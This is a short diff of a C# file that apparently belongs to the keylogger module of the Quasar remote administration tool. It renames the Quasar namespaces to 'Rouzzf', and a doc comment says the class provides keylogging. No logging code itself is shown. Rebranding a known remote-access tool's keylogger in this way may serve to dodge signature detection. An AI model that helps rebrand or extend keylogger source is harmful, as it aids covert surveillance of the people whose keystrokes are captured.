@@ -1,9 +1,9 @@
 ﻿using Gma.System.MouseKeyHook;
-using Quasar.Client.Config;
-using Quasar.Client.Extensions;
-using Quasar.Client.Helper;
-using Quasar.Common.Cryptography;
-using Quasar.Common.Helpers;
+using Rouzzf.Client.Config;
+using Rouzzf.Client.Extensions;
+using Rouzzf.Client.Helper;
+using Rouzzf.Common.Cryptography;
+using Rouzzf.Common.Helpers;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
@@ -14,7 +14,7 @@ using System.Web;
 using System.Windows.Forms;
 using Timer = System.Timers.Timer;
 
-namespace Quasar.Client.Logging
+namespace Rouzzf.Client.Logging
 {
     /// <summary>
     /// This class provides keylogging functionality and modifies/highlights the output for
